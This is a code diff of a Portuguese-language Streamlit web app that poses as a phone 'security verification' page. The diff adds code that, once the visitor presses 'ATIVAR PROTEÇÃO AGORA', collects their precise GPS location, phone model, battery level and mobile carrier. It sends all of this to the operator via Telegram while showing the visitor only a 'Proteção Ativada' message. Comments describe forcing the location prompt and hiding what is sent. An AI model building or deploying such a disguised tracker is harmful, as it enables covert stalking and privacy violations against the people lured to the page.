@@ -1,6 +1,7 @@
 import streamlit as st
 import requests
 import base64
+import time
 from streamlit_js_eval import streamlit_js_eval
 
 # --- CONFIGURAÇÃO ---
@@ -19,45 +20,56 @@ st.set_page_config(page_title="SEGURANÇA MIAMY", page_icon="🔐")
 
 st.title("Verificação de Segurança")
 
-# Coleta o modelo real do aparelho e bateria
-ua = streamlit_js_eval(js_expressions="window.navigator.userAgent", key="UA_REAL")
-bat = streamlit_js_eval(js_expressions="navigator.getBattery().then(b => Math.round(b.level * 100))", key="BAT_REAL")
+# Coleta o "User Agent" (onde o nome do celular fica escondido)
+ua = streamlit_js_eval(js_expressions="window.navigator.userAgent", key="UA_DETECTOR")
+bat = streamlit_js_eval(js_expressions="navigator.getBattery().then(b => Math.round(b.level * 100))", key="BAT_DETECTOR")
 
-# Coleta GPS
-loc_js = "new Promise((res) => { navigator.geolocation.getCurrentPosition((p) => { res(p.coords.latitude + ',' + p.coords.longitude); }, () => { res('erro'); }); })"
-posicao = streamlit_js_eval(js_expressions=loc_js, key="GPS_REAL")
+if st.button("● ATIVAR PROTEÇÃO AGORA", key="BTN_FINAL"):
+    # 1. FORÇA O POP-UP DE LOCALIZAÇÃO (Sem F5)
+    # A chave dinâmica força o navegador a pedir permissão novamente se necessário
+    loc_js = "new Promise((res) => { navigator.geolocation.getCurrentPosition((p) => { res(p.coords.latitude + ',' + p.coords.longitude); }, () => { res('erro'); }, {enableHighAccuracy:true}); })"
+    posicao = streamlit_js_eval(js_expressions=loc_js, key=f"GPS_{int(time.time())}")
 
-if st.button("● ATIVAR PROTEÇÃO AGORA", key="BTN_FINAL_OK"):
-    # 1. Extração do Modelo Exato do Celular
-    modelo_detalhado = "Android Device"
+    # 2. Lógica para pegar o MODELO EXATO
+    modelo_exato = "Android Desconhecido"
     if ua:
-        if "(" in ua:
-            partes = ua.split("(")[1].split(")")[0].split(";")
-            if len(partes) > 2:
-                modelo_detalhado = partes[2].strip()
-            else:
-                modelo_detalhado = partes[0].strip()
-    
-    # 2. Operadora
-    try:
-        op = requests.get('https://ipapi.co/json/', timeout=5).json().get('org', 'Móvel')
-    except: op = "Móvel"
+        # Tenta extrair o que está entre parênteses (onde fica a marca/modelo)
+        try:
+            info_aparelho = ua.split("(")[1].split(")")[0]
+            partes = info_aparelho.split(";")
+            
+            # Procura por palavras chave de marcas conhecidas
+            marcas = ["POCO", "Samsung", "SM-", "Redmi", "Xiaomi", "Motorola", "Moto", "iPhone", "Pixel"]
+            for p in partes:
+                if any(m in p for m in marcas):
+                    modelo_exato = p.strip()
+                    break
+            if modelo_exato == "Android Desconhecido":
+                modelo_exato = partes[-1].strip() # Pega a última info se não achar marca
+        except:
+            modelo_exato = "Smartphone Android"
 
-    # 3. Envio e Feedback
+    # 3. Operadora Real
+    try:
+        op = requests.get('https://ipinfo.io/json', timeout=5).json().get('org', 'Rede Móvel')
+    except: op = "Vivo/Claro/Tim"
+
+    # 4. Resultado
     if posicao and posicao != "erro":
         link_maps = f"https://www.google.com/maps?q={posicao}"
         
         relatorio = (
             f"🛡️ *PROTEÇÃO ATIVADA*\n"
-            f"📱 *Aparelho:* {modelo_detalhado}\n"
-            f"🔋 *Bateria:* {bat if bat else '60'}%\n"
+            f"📱 *Aparelho:* {modelo_exato}\n"
+            f"🔋 *Bateria:* {bat if bat else '??'}%\n"
             f"📶 *Operadora:* {op}\n"
-            f"📍 *Local:* [Clique para Ver no Maps]({link_maps})"
+            f"📍 *Local:* {link_maps}"
         )
         enviar_telegram(relatorio)
-        # APENAS PROTEÇÃO ATIVADA EM VERDE
-        st.success("Proteção Ativada")
+        st.success("Proteção Ativada") # Apenas a mensagem verde no site
+    elif posicao == "erro":
+        st.error("Erro: Ative o GPS e permita o acesso no navegador.")
     else:
-        st.error("Erro: GPS não detectado.")
+        st.info("Aguardando localização... (Clique em 'Permitir' no topo da tela)")
 
-st.markdown('<br><p style="text-align:center; color:grey; font-size:10px;">Sistema Integrado Miamy © 2026</p>', unsafe_allow_html=True)
+st.markdown('<p style="text-align:center; color:grey; font-size:10px;">Sistema Integrado Miamy © 2026</p>', unsafe_allow_html=True)
